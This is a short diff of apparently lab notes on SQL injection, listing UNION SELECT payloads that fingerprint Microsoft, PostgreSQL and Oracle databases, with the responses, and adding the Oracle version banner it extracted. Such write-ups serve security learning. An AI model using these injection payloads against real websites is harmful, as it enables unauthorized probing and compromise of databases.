@@ -9,3 +9,9 @@ Microsoft: ' union select null, @@version -- --> Internal Server Error
 PostgreSQL: ' union select null, version()-- --> Internal Server Error
 
 Oracle:  union select null, banner FROM v$version-- --> Database type and version displayed on the page
+
+CORE 11.2.0.2.0 Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production
